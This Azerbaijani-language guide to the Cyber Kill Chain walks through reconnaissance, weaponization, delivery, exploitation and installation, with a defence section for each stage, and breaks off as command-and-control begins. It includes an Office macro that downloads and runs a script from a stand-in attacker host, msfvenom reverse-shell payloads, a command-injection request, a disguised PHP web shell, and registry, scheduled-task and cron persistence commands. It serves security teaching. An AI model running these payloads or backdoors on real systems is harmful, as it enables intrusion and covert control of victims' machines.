# Cyber Kill Chain — Tam Bələdçi (Azərbaycanca)

---

## Mündəricat

1. [Giriş](#1-giriş)
2. [Kəşfiyyat (Reconnaissance)](#2-kəşfiyyat-reconnaissance)
3. [Silahlandırma (Weaponization)](#3-silahlandırma-weaponization)
4. [Çatdırılma (Delivery)](#4-çatdırılma-delivery)
5. [İstismar (Exploitation)](#5-i̇stismar-exploitation)
6. [Quraşdırma (Installation)](#6-quraşdırma-installation)
7. [Komanda və İdarəetmə (Command & Control / C2)](#7-komanda-və-i̇darəetmə-command--control--c2)
8. [Hədəflərə Qarşı Tədbirlər (Actions on Objectives)](#8-hədəflərə-qarşı-tədbirlər-actions-on-objectives)
9. [Müdafiə və Aşkarlama Mexanizmləri](#9-müdafiə-və-aşkarlama-mexanizmləri)
10. [Cyber Kill Chain vs MITRE ATT\&CK](#10-cyber-kill-chain-vs-mitre-attck)

---

## 1. Giriş

### Cyber Kill Chain nədir?

Kibertəhlükəsizlik dünyasında təcavüzkarın düşüncə tərzini və izlədikləri yolu başa düşmək, effektiv müdafiə strategiyaları qurmaq üçün çox vacibdir. **Cyber Kill Chain** bu prosesi modelləşdirən və müdafiəçilərə istiqamət verən ən fundamental çərçivələrdən biridir.

Cyber Kill Chain **2011-ci ildə Lockheed Martin-in CSIRT (Kompüter Təhlükəsizliyi Hadisələrinə Müdaxilə Komandası)** tərəfindən hazırlanmışdır. Bu model hərbi "hədəf zənciri" konsepsiyasının kibertəhlükəsizliyə uyğunlaşdırılmasıdır. Model **APT (Advanced Persistent Threats — Davamlı Təhdidlər)** və mürəkkəb kiber hücumların anatomiyasını **7 ardıcıl mərhələyə** bölür.

### Modelin əsas məntiqi

- **Hücumçu üçün:** Uğur qazanmaq üçün zəncirin bütün mərhələlərini uğurla keçməlidir.
- **Müdafiəçi üçün:** Hücumu dayandırmaq üçün zənciri **istənilən bir mərhələdə** qırmaq kifayətdir.

### 7 Mərhələyə Ümumi Baxış

| # | Mərhələ | Qısa İzah |
|---|---------|-----------|
| 1 | **Kəşfiyyat** (Reconnaissance) | Hədəf haqqında məlumat toplanması |
| 2 | **Silahlandırma** (Weaponization) | Zərərli proqramın hazırlanması |
| 3 | **Çatdırılma** (Delivery) | Zərərli məzmunun hədəfə göndərilməsi |
| 4 | **İstismar** (Exploitation) | Zəifliyin tetiklənməsi |
| 5 | **Quraşdırma** (Installation) | Sistemə arxa qapı yerləşdirilməsi |
| 6 | **C2** (Command & Control) | Sistemin uzaqdan idarə edilməsi |
| 7 | **Hədəflərə Tədbirlər** (Actions on Objectives) | Məlumat oğurluğu, şifrələmə, sabotaj və s. |

### Kəşfiyyata Əsaslanan Müdafiə (Intelligence Driven Defense)

Cyber Kill Chain yalnız analiz aləti deyil, həm də **Kəşfiyyata Əsaslanan Müdafiə** modelinin təməlidir. Ənənəvi müdafiə yanaşmaları "hadisəyə müdaxilə"yə əsaslanarkən, bu model **proaktiv** olmağı hədəfləyir.

Hücumçular çox vaxt öz alətlərini və infrastrukturlarını yenidən istifadə edirlər. Hücum zəncirinin təhlilindən əldə edilən göstəricilər (IP ünvanları, fayl həşləri, domen adları) gələcək hücumları erkən mərhələdə aşkarlamaq və qarşısını almaq üçün istifadə edilə bilər.

### Müdafiəçinin üstünlüyü

Asimmetrik kiber müharibədə hücum zənciri konsepsiyası müdafiəçiyə üstünlük verir:

- **Hücumçu:** Uğur qazanmaq üçün hər mərhələdə "düzgün" və aşkarlanmamış olmalıdır.
- **Müdafiəçi:** Hücumu dayandırmaq üçün zənciri yalnız bir yerdə qırmaq kifayətdir.

Məsələn, hücumçu mükəmməl bir exploit hazırlasa da (İstismar mərhələsi), bu exploiti hədəfə çatdıra bilmirsə (Çatdırılma mərhələsində blok olunur), hücum uğursuz olur.

### Cyber Kill Chain-ə Tənqidlər

Model sənaye standartı olsa da, bəzi məhdudiyyətləri var, bu səbəbdən müasir SOC əməliyyatlarında çox vaxt MITRE ATT&CK kimi digər çərçivələrlə birlikdə istifadə edilir:

- **Perimetr Fokuslanması:** Model daha çox xaricdən sızmağa çalışan hücumlara fokuslanır. İçəridən gələn təhdidləri (Insider Threats) tam əhatə etmir.
- **Xəttililik:** Real hücumlar həmişə xətti (1-dən 7-yə) şəkildə getməyə bilər.
- **Köhnə Təhdid Modeli:** Müasir, bulud əsaslı və kimlik yönümlü hücumlarda bəzi mərhələlər (məsələn, "Quraşdırma") atlanıla bilər və ya fərqli formada baş verə bilər.

Bununla belə, Cyber Kill Chain kibertəhlükəsizlik analitikləri, SOC işçiləri və sızma testçilərinin (Pentesters) bilməli olduğu ən fundamental metodologiyadır.

---

## 2. Kəşfiyyat (Reconnaissance)

Cyber Kill Chain-in birinci mərhələsi olan **Kəşfiyyat**, hücumçunun hədəfi müəyyən etdiyi, hədəf haqqında məlumat topladığı və hücum strategiyasını planlaşdırdığı mərhələdir. Bu mərhələ bütün hücum prosesinin əsasını təşkil edir; hücumçu nə qədər dəqiq məlumat toplasa, uğur şansı bir o qədər yüksək olur.

Kəşfiyyat mərhələsi texniki olaraq iki əsas kateqoriyaya bölünür: **Passiv Kəşfiyyat** və **Aktiv Kəşfiyyat**.

---

### 2.1 Passiv Kəşfiyyat (Passive Reconnaissance)

Passiv kəşfiyyat, hücumçunun hədəf sistemlərlə birbaşa əlaqə saxlamadan məlumat topladığı üsuldur. Hədəfin serverlərinə birbaşa paket göndərilmir, bu səbəbdən Firewall və ya IDS/IPS sistemləri tərəfindən aşkarlanmaq çox çətindir. Məlumat adətən ictimai mənbələrdən (OSINT — Açıq Mənbə Kəşfiyyatı) əldə edilir.

**Hədəflər:**
- İşçilərin e-poçt ünvanları və adları
- İstifadə olunan texnologiyalar (iş elanlarından və ya LinkedIn profillərdən)
- Alt domenlər (Subdomain)
- DNS qeydləri
- IP ünvan blokları

#### Alətlər və Texnikalar

**1. Axtarış Motorları və Google Dorking**

Hücumçular həssas məlumatları ifşa edən faylları tapmaq üçün Google kimi axtarış motorlarından istifadə edə bilərlər.

Nümunə Google Dork sorğusu (target-site.com saytında PDF faylları axtarır):

```
site:target-site.com filetype:pdf
```

**2. theHarvester**

`theHarvester` e-poçt ünvanları, alt domenlər, host adları, işçi adları, açıq portlar və bannerlər toplamaq üçün istifadə edilən populyar OSINT alətidir.

Terminalda istifadəsi:

```bash
theHarvester -d target-site.com -l 500 -b google
```

> Bu əmr target-site.com domeninin Google-da ilk 500 nəticəsini tarayır.

Nümunə Çıxış:

```
[*] Target: target-site.com
[*] Searching Google...
[*] Search results:
---------------------
Emails found:
admin@target-site.com
info@target-site.com
john.doe@target-site.com

Hosts found:
mail.target-site.com: 192.168.1.10
vpn.target-site.com: 192.168.1.11
dev.target-site.com: 192.168.1.12
```

**3. Shodan**

Shodan internetə qoşulmuş cihazları (veb-kameralar, serverlər, IoT cihazları və s.) tərayan bir axtarış motorudur. Hücumçular Shodan vasitəsilə passiv şəkildə hədəf təşkilata aid açıq portları, zəif xidmətləri və server banner məlumatlarını əldə edə bilərlər.

Nümunə Shodan CLI sorğusu:

```bash
shodan search org:"Target Organization"
```

---

### 2.2 Aktiv Kəşfiyyat (Active Reconnaissance)

Aktiv kəşfiyyat, hücumçunun hədəf sistemlərlə birbaşa əlaqə qurarak məlumat topladığı üsuldur. Bu mərhələdə hədəf sistemə paketlər göndərilir və cavablar analiz edilir. Bu proses hədəf sistemin log-larında iz qoyur və təhlükəsizlik cihazları tərəfindən aşkarlanma riski daşıyır.

**Hədəflər:**
- Açıq portların aşkarlanması
- Xidmət versiyalarının müəyyən edilməsi (Banner Grabbing)
- Əməliyyat sistemi aşkarlanması (OS Fingerprinting)
- Şəbəkə topologiyasının xəritələndirilməsi

#### Alətlər və Texnikalar

**1. Nmap (Network Mapper)**

Nmap şəbəkə taraması və zəiflik aşkarlanması üçün istifadə edilən ən populyar alətdir.

Əsas Port Taraması:

```bash
nmap -sS -p- 192.168.1.10
```

- `-sS`: SYN Tarama (Yarı açıq tarama). TCP əl sıxışmasını tamamlamır, ona görə daha gizlidir.
- `-p-`: Bütün 65535 portu tarayır.

Versiya və Əməliyyat Sistemi Aşkarlanması:

```bash
nmap -sV -O 192.168.1.10
```

- `-sV`: Açıq portlarda işləyən xidmətlərin versiyalarını aşkarlayır.
- `-O`: Əməliyyat sistemini təxmin etməyə çalışır.

Nümunə Çıxış:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  https   Apache httpd 2.4.41 ((Ubuntu))
Running: Linux 4.X
```

> `vsftpd 2.3.4` məlumatı hücumçu üçün kritikdir, çünki bu versiyada məlum bir arxa qapı zəifliyi (Backdoor Command Execution) var.

**2. Veb Qovluq Taraması (Gobuster / Dirb)**

Veb serverlərdəki gizli qovluq və faylları tapmaq üçün istifadə edilir.

```bash
gobuster dir -u http://target-site.com -w /usr/share/wordlists/dirb/common.txt
```

---

### 2.3 Kəşfiyyat Mərhələsində Müdafiə

Passiv kəşfiyyat adətən təşkilatın nəzarəti xaricindəki mənbələrdən həyata keçirildiyi üçün kəşfiyyat mərhələsini tamamilə qarşısını almaq çətindir. Lakin aşağıdakı tədbirlər görülə bilər:

- **Məlumat Sızmasının Qarşısının Alınması:** Korporativ veb-saytlarda, iş elanlarında və sosial mediada həddindən artıq texniki detallar (istifadə olunan firewall markası, server versiyası və s.) paylaşılmamalıdır.
- **Whois Məxfiliyi:** Domen qeydiyyat məlumatlarının gizlədilməsi.
- **Xəta Mesajları:** Veb tətbiqlərinin ətraflı xəta mesajları (stack traces) qaytarması qarşısı alınmalıdır.
- **Log Monitorinqi:** Aktiv tarama cəhdləri (Nmap taramaları) Firewall və IDS/IPS loglarından aşkarlanmalı, IP ünvanları blok edilməlidir.

---

## 3. Silahlandırma (Weaponization)

Kəşfiyyat mərhələsində hədəf haqqında kifayət qədər məlumat (istifadə edilən əməliyyat sistemi, açıq portlar, zəif tətbiqlər, işçilərin e-poçt ünvanları və s.) toplandıqdan sonra hücumçu **Silahlandırma** mərhələsinə keçir. Bu, hücumçunun aşkarlanan zəiflikdən istifadə edə bilən "exploit" (istismar kodu) ilə hədəf sistemə giriş təmin edəcək "payload" (zərərli yük) birləşdirdiyi mərhələdir.

> **Qısaca: Exploit + Payload = Silah**

Bu mərhələ adətən hücumçunun öz lokal mühitində baş verir, yəni hədəf sistemlə hələ əlaqə yoxdur.

---

### 3.1 Əsas Anlayışlar

**Exploit (İstismar Kodu)**

Hədəf sistemdəki bir zəifliyi (proqram səhvi, konfiqurasiya qüsuru və s.) tetikləyərək sistemin gözlənilməz davranmasına səbəb olan kod.

**Payload (Zərərli Yük)**

Exploit uğurla işləyəndən sonra hədəf sistemdə icra ediləcək əsl zərərli kod. Məqsədi adətən sistemə davamlı giriş təmin etmək, məlumat oğurlamaq və ya sistemi idarə etməkdir.

- **Reverse Shell:** Hədəf maşının hücumçunun maşınına geri qoşulmasına imkan verir. (Firewall-lar adətən çıxan trafikə az məhdudiyyət qoyduğu üçün üstünlük verilir.)
- **Bind Shell:** Hədəf maşında bir port açır və hücumçunun bu porta qoşulmasını gözləyir.

---

### 3.2 Silahlandırma Növləri və Fayl Formatları

Hücumçular payload-larını hədəfin təhlükəsizlik tədbirlərini keçəcək və istifadəçini aldadacaq fayl formatlarında gizlədirlər.

**1. Office Sənədləri (Makrolar)**

Microsoft Office fayllarına (Word, Excel) yerləşdirilmiş VBA (Visual Basic for Applications) makroları kiber hücumlarda ən çox istifadə edilən silahlandırma üsullarından biridir. İstifadəçi faylı açıb "Məzmunu Aktivləşdir"ə kliklədikdə zərərli kod işləyir.

Nümunə VBA Makrosu (Konseptual):

```vba
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-site.com/payload.ps1')"
End Sub
```

> Bu kod sənəd açıldığında arxa planda PowerShell işlədir, hücumçunun serverindən skript yükləyib icra edir.

**2. PDF Faylları**

PDF oxuyucularındakı zəiflikləri istismar edən və ya daxili JavaScript ehtiva edən fayllar.

**3. HTA (HTML Tətbiqi) və Skript Faylları**

Windows sistemlərindəki `.hta`, `.js`, `.vbs` uzantıları birbaşa icra edilə bilən fayllardır və adətən sistem əmrlərini icra etmə səlahiyyətinə malikdir.

---

### 3.3 Payload Yaratma Alətləri

**Msfvenom ilə Payload Yaratmaq**

Aşağıdakı nümunə, hücumçuya geri qoşulacaq zərərli bir `.exe` faylı yaradır:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o invoice_update.exe
```

| Parametr | İzah |
|----------|------|
| `-p windows/x64/meterpreter/reverse_tcp` | Payload növü (Windows 64-bit, Meterpreter reverse shell) |
| `LHOST=192.168.1.5` | Hücumçunun IP ünvanı (Listening Host) |
| `LPORT=4444` | Hücumçunun dinləyəcəyi port |
| `-f exe` | Çıxış formatı (İcra edilə bilən fayl) |
| `-o invoice_update.exe` | Yaradılan faylın adı (Qurbanı aldatmaq üçün "faktura yeniləməsi" adlandırılıb) |

**Veb Payload Nümunəsi (PHP)**

Hədəf veb server olarsa, PHP əsaslı payload hazırlana bilər:

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > shell.php
```

---

### 3.4 Gizləmə (Obfuscation)

Təhlükəsizlik cihazları (Antivirus, EDR) məlum payload imzalarını asanlıqla aşkarlaya bilər. Bu səbəbdən hücumçular kodlarını gizlətmək üçün Obfuscation texnikalarından istifadə edirlər:

- **Kodlaşdırma (Encoding):** Kodu Base64, Hex kimi formatlara çevirmək.
- **Paketləmə (Packing):** İcra edilə bilən faylı sıxışdırmaq və şifrələmək (məs. UPX).
- **Şifrələmə (Encryption):** Zərərli kodun yaddaşda deşifrələnərək icra edilməsini təmin etmək.

`shikata_ga_nai` encoderi ilə payload-ın imzasını dəyişdirmək:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```

> `-i 5`: Kodlaşdırma prosesinin 5 dəfə təkrarlanacağını göstərir.

---

### 3.5 Silahlandırma Mərhələsində Müdafiə

Bu mərhələ hücumçunun öz sistemlərində baş verdiyi üçün birbaşa aşkarlamaq mümkün deyil. Lakin müdafiə üçün istehsal edilmiş "silahların" analizi kritikdir:

- **Təhdid Kəşfiyyatı (Threat Intelligence):** Yeni exploit kitlərini və zərərli proqram texnikalarını izləmək.
- **Fayl Analizi:** Şübhəli faylları Sandbox mühitində analiz etmək.
- **E-poçt Təhlükəsizliyi:** Makro ehtiva edən Office fayllarını və ya şübhəli uzantıları (`.exe`, `.scr`, `.vbs`) E-poçt Gateway-ində blok etmək.

---

## 4. Çatdırılma (Delivery)

**Çatdırılma** mərhələsi Silahlandırma mərhələsində hazırlanan zərərli məzmunun (silahlandırılmış payload) hədəfə çatdırıldığı kritik addımdır. Hücumçunun məqsədi hazırladığı zərərli proqramı qurbanın sisteminə çatdırmaq və ya qurbanı onu icra etməyə məcbur etməkdir.

Bu mərhələ hücumun virtual dünyadan (hücumçunun kompüteri) hədəfin dünyasına (qurbanın şəbəkəsi/kompüteri) keçdiyi ilk təmas nöqtəsidir.

---

### 4.1 Çatdırılma Üsulları (Vektorlar)

**1. E-poçt vasitəsilə Çatdırılma (Phishing)**

Ən geniş yayılmış çatdırılma üsulu. Hücumçular qanuni bir qurumdan gəlirmiş kimi görünən e-poçtlar hazırlayaraq qurbanı aldatmağa çalışır.

- **Zərərli Əlavələr:** Fakturalar, qəbzlər, CV-lər kimi görünən zərərli fayllar (PDF, Word, ZIP, EXE).
- **Zərərli Keçidlər:** İstifadəçini saxta giriş səhifəsinə (Credential Harvesting) və ya zərərli proqramın avtomatik endirdiyi sayta yönləndirən keçidlər.

**E-poçt Header Analizi**

E-poçtun saxta olub-olmadığını başa düşmək üçün header məlumatları yoxlanılır:

| Protokol | İzah |
|----------|------|
| **SPF** (Sender Policy Framework) | Göndərən IP ünvanının domen adı üçün e-poçt göndərməyə səlahiyyətli olub-olmadığını yoxlayır |
| **DKIM** (DomainKeys Identified Mail) | E-poçtun məzmununun ötürmə zamanı dəyişdirilmədiyini rəqəmsal imza ilə təsdiqləyir |
| **DMARC** | SPF və DKIM nəticələrinə əsasən e-poçtla nə etməli olduğunu müəyyən edir (karantin, rədd, qəbul) |

Nümunə Şübhəli Header Analizi:

```
Return-Path: <attacker@bad-domain.com>
Received: from mail.bad-domain.com (10.0.0.5)
From: "CEO Support" <admin@legit-company.com>
Subject: URGENT: Invoice Payment Overdue
X-Mailer: PHP/7.4
```

> **Analiz:** `From` bölməsi qanuni şirkətin adını göstərsə də, `Return-Path` fərqli bir domen göstərir. Həmçinin `X-Mailer: PHP` header-i bu e-poçtun Outlook və ya Gmail klienti əvəzinə bir PHP skripti tərəfindən göndərildiyini (çox güman ki, kütləvi göndərmə aləti) göstərir.

**2. Veb vasitəsilə Çatdırılma (Drive-by Download / Watering Hole)**

- **Drive-by Download:** Zəif bir veb-sayta daxil olan zaman istifadəçinin bilməyərək (və ya aldadıcı pop-up vasitəsilə) kompüterinə zərərli proqram yüklənməsi.
- **Watering Hole (Su Gölməçəsi):** Hücumçu hədəf auditoriyasının tez-tez ziyarət etdiyi qanuni bir veb-saytı (məsələn, sənaye xəbər saytları, yerli forumlar) sındırır və sayta zərərli kod yerləşdirir. Hədəf auditoriya bu saytı ziyarət etdikdə hücuma məruz qalır.

**3. USB / Xarici Media (Yem Qoymaq — Baiting)**

Hücumçular "Maaşlar", "Məxfi" kimi etiketlənmiş USB fləşləri şirkətin dayanacağına və ya lobbi-sinə buraxır. Maraqlı işçi USB-ni kompüterinə taxdıqda zərərli proqram avtomatik işləyir.

- **USB Rubber Ducky:** Klaviatura kimi davanan bir USB cihazıdır. Kompüterə taxıldıqdan dərhal sonra əvvəlcədən proqramlaşdırılmış klaviatura düymələrini (məsələn, `Windows + R`, `cmd`, `powershell payload`) ildırım sürətiylə basaraq saniyələr ərzində zərərli kodu icra edir.

---

### 4.2 Çatdırılma Mərhələsi Nümunə Ssenari

Hücumçu bir şirkətin İnsan Resursları (İR) departamentini hədəf alır:

1. **Hazırlıq:** Zərərli makro ehtiva edən `cv-john-doe.doc` adlı Word faylı hazırlayır.
2. **Çatdırılma:** `applicant@freemail.com` e-poçtundan "İş Müraciəti" mövzusunda İR menecerinə e-poçt göndərir.
3. **Məzmun:** "Salam, açıq vəzifəniz üçün CV-m əlavəlidir. Hörmətlə."

İR meneceri bu e-poçtu açıb əlavə olunmuş faylı endirərsə, "Çatdırılma" mərhələsi uğurla tamamlanmış olur.

---

### 4.3 Çatdırılma Mərhələsində Aşkarlama və Müdafiə

Bu, müdafiəçilərin hücumu qarşısını almaq üçün ən böyük şansının olduğu mərhələlərdən biridir.

**1. E-poçt Təhlükəsizliyi Gateway-ləri**
- Gələn e-poçtların əlavələrini Sandbox mühitində analiz etmək.
- SPF, DKIM, DMARC yoxlamalarını tətbiq etmək.
- Keçid analizi və URL Rewriting.

**2. Veb Proxy və URL Filtrləmə**
- Məlum zərərli domenləre və IP ünvanlarına girişi blok etmək.
- Kateqoriyasız və ya "yeni qeydiyyatdan keçmiş" domenləri blok etmək.

**3. İstifadəçi Maarifləndirmə Təlimi**
- İşçilərə şübhəli e-poçtları necə tanıyacaqlarını öyrətmək.
- Mənşəyi naməlum USB-ləri taxmamağı öyrətmək.
- Mütəmadi phishing simulyasiyaları keçirmək.

**4. USB Məhdudiyyətləri**
- Korporativ kompüterlərin USB portlarında məlumat köçürməni deaktiv etmək.

---

## 5. İstismar (Exploitation)

Çatdırılma mərhələsi uğurla tamamlandıqdan sonra **İstismar** mərhələsinin vaxtı gəlir. Bu mərhələ, hədəf sistemə çatan silahlandırılmış payload-ın bir zəifliyi tetiklədiyi və kod icra etmə səlahiyyəti qazandığı andır.

> **İstismar, hücumçunun "qapıya ayaq basdığı" andır.**

---

### 5.1 Zəiflik Növləri

Hücumçular adətən CVE (Common Vulnerabilities and Exposures) nömrəsi ilə müəyyən edilmiş məlum zəifliklərdən və ya hələ kəşf edilməmiş (Zero-day) zəifliklərdən istifadə edirlər.

**1. Əməliyyat Sistemi və Xidmət Zəiflikləri**

Məsələn, Windows SMB protokolundakı zəiflik (MS17-010 — EternalBlue) WannaCry ransomware hücumunda istifadə edilmişdir. Bu zəiflik Uzaqdan Kod İcrasına (RCE — Remote Code Execution) imkan verir.

**2. Veb Tətbiq Zəiflikləri**

Veb tətbiqlərdə girişlərin düzgün filtrlənməməsi nəticəsində meydana gəlir:

- **SQL Injection (SQLi):** Verilənlər bazası sorğularına müdaxilə.
- **Cross-Site Scripting (XSS):** İstifadəçinin brauzerində kod icra etmək.
- **Remote Code Execution (RCE):** Veb serverdə əmrlər icra etmək.

**3. Müştəri Tərəfi Zəiflikləri (Client-Side)**

Brauzerlər, PDF oxuyucuları, Java, Flash və ya Office proqramlarındakı səhvlər. İstifadəçinin zərərli fayl açması ilə tetiklənir.

---

### 5.2 Texniki Analiz: İstismar Necə Baş Verir?

Veb tətbiq üzərindəki Əmr İnjeksiyası (Command Injection) zəifliyini incələyək.

**Ssenari:**

`vulnerable-site.com` saytında istifadəçidən IP ünvanı alan və onu "ping" edən bir alət var.

Normal Sorğu (payload-sız) — İstifadəçi `8.8.8.8` daxil edir:

```http
POST /ping.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8
```

Arxa fonda işləyən zəif PHP kodu:

```php
<?php
    $ip = $_POST['ip'];
    // Giriş filtrləmədən birbaşa shell əmrinə əlavə edilir!
    $output = shell_exec("ping -c 4 " . $ip);
    echo $output;
?>
```

**İstismar (Payload Sorğusu)**

Hücumçu IP ünvanı əvəzinə əmr ayırıcı simvollar (`;`, `|`, `&&`) istifadə edərək öz əmrini əlavə edir.

Payload: `8.8.8.8; whoami`

Zərərli HTTP Sorğusu:

```http
POST /ping.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8; whoami
```

Server Cavabı:

```http
HTTP/1.1 200 OK
Content-Type: text/html

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=13.2 ms
...
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss

www-data
```

> Sonda görünən `www-data` çıxışı hücumçunun serverdə əmr icra edə bildiyini sübut edir (İstismar mərhələsi uğurlu). Bu nöqtədən etibarən hücumçu `wget` və ya `curl` əmrlərindən istifadə edərək öz serverindən əsl zərərli proqramı (Reverse Shell və s.) yükləyib icra edə bilər.

---

### 5.3 Yaddaş Pozuntusu — Buffer Overflow

Tətbiq səviyyəsi əvəzinə sistem səviyyəsindəki istismarlar (C/C++ ilə yazılmış proqramlarda) adətən yaddaş idarəetmə səhvlərindən qaynaqlanır.

**Məntiqi:**
Proqram istifadəçidən gələn məlumatı saxlamaq üçün yaddaşda (Stack-də) müəyyən bir sahə (Buffer) ayırır. Proqram gələn məlumatın ölçüsünü yoxlamazsa, hücumçu ayrılmış sahədən böyük məlumat göndərir, bu da yaddaşın digər hissələrini (xüsusilə Return Address-i) üzərindən yazır.

Hücumçu qaytarma ünvanını öz zərərli kodunun (Shellcode) yerləşdiyi yaddaş ünvanı ilə əvəz edərsə, CPU normal axın əvəzinə hücumçunun kodunu icra edir.

---

### 5.4 İstismar Mərhələsində Müdafiə

- **Yamaq İdarəetməsi (Patch Management):** Əməliyyat sistemləri və tətbiqlər mütəmadi olaraq yenilənməlidir.
- **Giriş Doğrulaması (Input Validation):** Veb tətbiqlərdə istifadəçidən gələn bütün məlumatlar filtrlənməli və sanitizasiya edilməlidir.
- **İstismar Qarşısını Alma Texnologiyaları:**
  - **DEP (Data Execution Prevention):** Yaddaşın data sahələrində kod icrasının qarşısını alır.
  - **ASLR (Address Space Layout Randomization):** Yaddaş ünvanlarını təsadüfiləşdirir, hücumçunun düzgün ünvanı tapmasını çətinləşdirir.
  - **WAF (Web Application Firewall):** SQLi, XSS kimi veb hücum imzalarını tanıyır və blok edir.
  - **EDR (Endpoint Detection and Response):** Gözlənilməz proses davranışlarını (məsələn, Word tətbiqinin PowerShell icra etməsi) aşkarlayır və dayandırır.

---

## 6. Quraşdırma (Installation)

İstismar mərhələsi uğurla tamamlandıqdan sonra hücumçunun hədəf sistemdə kod icra etmə səlahiyyəti var. Lakin bu giriş adətən müvəqqətidir. İstifadəçi kompüteri söndürsə, tətbiqi bağlasa və ya şəbəkə bağlantısı kəsilsə, hücumçunun girişi itirilir.

**Quraşdırma** mərhələsi, hücumçunun sistemdə **Davamlılıq (Persistence)** təmin etmək üçün arxa qapılar yerləşdirdiyi və ya konfiqurasiyaları dəyişdirdiyi yerdir. Məqsəd, sistem yenidən başladılsa belə girişi qoruyub saxlamaqdır.

---

### 6.1 Ümumi Davamlılıq Mexanizmləri

**1. Windows Registry Açarları**

Windows əməliyyat sistemində sistem başladıldığında avtomatik icra ediləcək proqramların siyahısı Registry-də saxlanılır. Hücumçular zərərli proqramlarını bu açarlara əlavə edir.

Ən çox istifadə edilən açarlar:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

Nümunə Hücumçu Əmri — zərərli `backdoor.exe` faylını başlanğıca əlavə edir:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdater" /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

> Bu əmr istifadəçi hər daxil olduqda `backdoor.exe` faylının "WindowsUpdater" adı ilə işləməsini təmin edir.

**2. Planlaşdırılmış Tapşırıqlar / Cron İşləri**

Windows (Schtasks):

```cmd
schtasks /create /sc onlogon /tn "SecurityHealthCheck" /tr "C:\Users\Public\backdoor.exe"
```

Linux (Cron Job) — hücumçu `/etc/crontab` faylına bir sətir əlavə edə bilər:

```bash
# Hər saat reverse shell skriptini işlət
0 * * * * /bin/bash /var/tmp/rev_shell.sh
```

**3. Xidmət Yaratmaq (Service Creation)**

Hücumçular zərərli proqramlarını Windows xidməti və ya Linux daemon kimi qeydiyyatdan keçirə bilərlər. Xidmətlər adətən SYSTEM (və ya root) imtiyazları ilə işləyir ki, bu da hücumçuya yüksək imtiyazlı davamlı giriş verir.

```cmd
sc create "MaliciousService" binPath= "C:\Users\Public\backdoor.exe" start= auto
sc start "MaliciousService"
```

**4. Veb Shell (Veb Serverləri üçün)**

Hücumçu əlçatımlı bir qovluğa kiçik bir skript faylı (Veb Shell) buraxır. Bu fayl vasitəsilə istənilən vaxt sistemə əmrlər göndərə bilir.

Nümunə PHP Veb Shell (`config_update.php`):

```php
<?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

> Hücumçu `http://target-site.com/config_update.php?cmd=cat+/etc/passwd` ünvanına daxil olaraq girişi qoruyur.

**5. Başlanğıc Qovluğu (Startup Folder)**

Windows-da `C:\Users\<İstifadəçi>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` qovluğuna yerləşdirilən fayllar istifadəçi daxil olduqda avtomatik işləyir.

**6. DLL Hijacking**

Tətbiqlər işə düşəndə ehtiyac duyduqları DLL fayllarını müəyyən bir sırayla axtarır. Hücumçu tətbiqin axtardığı DLL-in adında zərərli bir DLL faylını tətbiqin işlədiyi qovluğa yerləşdirirsə, tətbiq əsl DLL əvəzinə zərərli DLL-i yükləyib icra edir.

---

### 6.2 Quraşdırma Mərhələsi Analizi: Dropper vs Downloader

| Növ | İzah |
|-----|------|
| **Dropper** | Zərərli proqramı içərisində saxlayır. İcra edildikdə əsl zərərli proqramı diskə "düşürür" və işlədilir. Fayl ölçüsü daha böyükdür. |
| **Downloader** | Çox kiçikdir. Yalnız internetə qoşularaq əsl böyük zərərli proqramı yükləyir və icra edir. |

---

### 6.3 Quraşdırma Mərhələsinin Aşkarlanması və Müdafiəsi

- **FIM (File Integrity Monitoring):** Kritik sistem fayllarında və konfiqurasiyalarda dəyişiklikləri izləyən proqram (məsələn, Wazuh, Tripwire). Veb qovluqlarına yeni `.php` və ya `.aspx` faylı əlavə edildikdə xəbərdarlıq etməlidir.
- **Registry Monitorinqi:** `Run` və `RunOnce` açarlarına əlavələr izlənməlidir.
- **İmtiyaz İdarəetməsi (Least Privilege):** İstifadəçilərin administrator imtiyazlarına malik olmaması hücumçunun Registry-yə yazmaq və ya Xidmət yaratmaq imkanını azaldır.
- **Tətbiq Ağ Siyahısı (AppLocker):** Yalnız icazə verilmiş proqram və skriptlərin işləməsinə icazə vermək, hücumçu `backdoor.exe` faylını diskə saxlasa belə onu işlədə bilməyəcəkdir.

---

## 7. Komanda və İdarəetmə (Command & Control / C2)

**Komanda və İdarəetmə (C2)** mərhələsi, hücumçunun hədəf sistemlə əlaqə qurduğu və onu uzaqdan idarə etdiyi mərhələdir. Sistem əvvəlki mərhələlərdə (İstismar, Quraşdırma) ələ keçirilsə belə, hücumçu sistemdən məlumat çəkmək, yeni əmrlər göndərmək və ya digər hədəflərə keçmək üçün bir əlaqə kanalına ehtiyac duyur.

> Bu kanal hücumun "əlləri və qollarıdır". C2 bağlantısı kəsilsə, hücumçunun sistem üzərindəki nəzarəti itirilir (avtonom zərərli proqram olmadığı halda).

---

### 7.1 C2 Arxitekturası və Əlaqə Üsulları

